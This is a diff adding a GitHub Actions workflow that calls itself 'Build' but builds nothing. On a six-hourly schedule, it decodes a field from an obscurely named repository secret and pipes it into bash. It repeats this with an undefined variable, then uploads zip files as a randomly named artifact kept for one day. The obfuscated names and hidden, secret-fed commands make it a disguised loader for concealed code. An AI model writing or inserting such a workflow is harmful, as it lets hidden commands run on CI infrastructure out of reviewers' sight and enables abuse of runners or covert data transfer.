@@ -1,0 +1,29 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '24 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          qakoc09: ${{ secrets.qakoc09 }}
+        run: |
+          printf '%s' "$qakoc09" | jq -r .o9827 | /bin/bash
+          printf '%s' "$l78" | jq -r .i7944 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: vfy9LJml
+          path: "*.zip"
+          retention-days: 1
